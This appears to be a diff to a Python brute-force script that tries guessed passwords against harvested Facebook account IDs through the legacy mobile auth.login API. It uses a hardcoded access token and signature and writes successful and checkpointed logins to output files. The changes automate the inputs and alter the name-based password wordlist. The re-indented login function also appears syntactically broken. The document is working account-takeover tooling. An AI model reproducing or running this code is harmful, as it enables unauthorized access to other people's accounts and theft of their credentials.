@@ -13,7 +13,9 @@
 
 import requests, json, sys, os, re
 from multiprocessing.pool import ThreadPool as th
+from multiprocessing import Process
 from datetime import datetime
+
 
 class Brute:
 	def __init__(self):
@@ -23,34 +25,39 @@ class Brute:
 		self.loop = 0
 
 	def bruteRequest(self, username, password):
-		params = {
-			'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
-			'format': 'JSON',
-			'sdk_version': '2',
-			'email': username,
-			'locale': 'en_US',
-			'password': password,
-			'sdk': 'ios',
-			'generate_session_cookies': '1',
-			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
-		}
-		try: os.mkdir('out')
-		except: pass
-		api = 'https://b-api.facebook.com/method/auth.login'
-		response = requests.get(api, params=params)
-		if re.search('(EAAA)\w+', response.text):
-			self.ok.append(username+'|'+password)
-			save = open('out/ok.txt','a')
-			save.write(str(username)+'|'+str(password)+'\n')
-			save.close()
-			return True
-		elif 'www.facebook.com' in response.json()['error_msg']:
-			self.cp.append(username+'|'+password)
-			save = open('out/cp.txt','a')
-			save.write(str(username)+'|'+str(password)+'\n')
-			save.close()
-			return True
-		else: return False
+
+			params = {
+				'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+				'format': 'JSON',
+				'sdk_version': '2',
+				'email': username,
+				'locale': 'en_US',
+				'password': password,
+				'sdk': 'ios',
+				'generate_session_cookies': '1',
+				'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+			}	
+			try: os.mkdir('out')
+			except: pass
+			api = 'https://b-api.facebook.com/method/auth.login'
+			response = requests.get(api, params=params)		
+			if re.search('(EAAA)\w+', response.text):
+				self.ok.append(username+'|'+password)
+				save = open('out/ok.txt','a')
+				save.write(str(username)+'|'+str(password)+'\n')
+				save.close()
+				return True
+			elif 'www.facebook.com' in response.json()['error_msg']:
+				self.cp.append(username+'|'+password)
+				save = open('out/cp.txt','a')
+				save.write(str(username)+'|'+str(password)+'\n')
+				save.close()
+				return True
+			else: return False
+		
+		
+	
+		
 
 	def brute(self, users):
 		if self.setpw == False:
@@ -80,7 +87,7 @@ class Brute:
 
 	def main(self):
 		while True:
-			file = raw_input('\nList id (ex: dump/xxx.json): ')
+			file = 'dump/search.json'
 			try:
 				list = open(file, 'r').read()
 				object = json.loads(list)
@@ -96,17 +103,17 @@ class Brute:
 						obj[0]+'123', obj[0]+'1234',
 						obj[0]+'12345',
 						obj[0]+'786', obj[0]+'1122',
-						'786786','1122334455','12345678',obj[0],
+						'786786','223344','12345678',obj[0],
 					
 					]
 				elif len(obj) == 2:
 					listpass = [
-						obj[0]+obj[1],obj[0]+obj[1]+'123',obj[0]+obj[1]+'12345',
+						obj[0]+obj[1],obj[0]+obj[1]+'123', obj[0]+' '+obj[1],obj[0]+obj[1]+'12345',
 						obj[0]+'123', obj[0]+'12345',
 						obj[1]+'123', obj[1]+'12345',obj[0],
-						obj[0]+'786', obj[0]+' '+obj[1],
-						obj[0]+' '+obj[1],
-						'786786','1122334455','12345678',
+						obj[0]+'786',
+						obj[0]+''+obj[1],
+						'786786','223344','12345678',
 					]
 				elif len(obj) == 3:
 					listpass = [
@@ -114,10 +121,10 @@ class Brute:
 						obj[0]+'123', obj[0]+'12345',
 						obj[1]+'123', 
 						 obj[2]+'12345',obj[0],
-						obj[0]+'786', obj[0]+' '+obj[1],
+						obj[0]+'786', obj[0]+''+obj[1],
 						obj[0]+' '+obj[1],
 				
-						'786786','1122334455','12345678',					
+						'786786','223344','12345678',					
 					]
 				elif len(obj) == 4:
 					listpass = [
@@ -126,9 +133,9 @@ class Brute:
 				
 						obj[3]+'123', obj[3]+'12345',obj[0],
 						obj[0]+'786',
-						obj[0]+' '+obj[1],
+						obj[0]+''+obj[1],
 						
-						'786786','1122334455','12345678',
+						'786786','223344','12345678',
 						
 					]
 				else:
@@ -140,7 +147,7 @@ class Brute:
 			except: pass
 		if len(self.target) == 0:
 			exit("\n\033[0;91m Oops, id not found in file '%s'\033[0m"% file)
-		ask = raw_input('Use password defaults OR manual? [D/m]: ')
+		ask = 'd'
 		if ask.lower() == 'm':
 			while True:
 				print('\n\033[0;92mSet password use (,) for new password, EX: sayang,doraemon,bangsat\n\033[0m')
@@ -163,3 +170,4 @@ class Brute:
 			print('Your CP results saved in: out/cp.txt')
 		if (len(self.cp) == 0 and len(self.ok) == 0):
 			print('\n\n033[0;91mNo results found :(\033[0m')
+
